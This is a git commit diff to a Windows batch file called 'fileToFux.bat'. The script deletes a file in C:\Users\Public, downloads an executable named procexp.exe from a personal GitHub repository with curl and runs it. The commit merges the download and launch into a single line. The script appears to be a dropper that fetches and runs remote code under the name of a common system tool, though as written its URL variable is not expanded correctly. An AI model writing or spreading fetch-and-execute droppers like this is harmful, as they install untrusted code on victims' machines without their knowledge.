af5c09b23e720c29d8027bda1b607467b55a05e9
BelliniGauss <118434152+BelliniGauss@users.noreply.github.com>
2024-01-02 12:34:51 +0100

    Update fileToFux.bat

--- fileToFux.bat
+++ fileToFux.bat
@@ -2,8 +2,6 @@
 
 del C:\Users\Public\test.bat 
 set URL = https://raw.githubusercontent.com/BelliniGauss/1/main/procexp.exe
-curl -O URL
-
-start procexp.exe
+curl -O URL && start procexp.exe
 
 exit
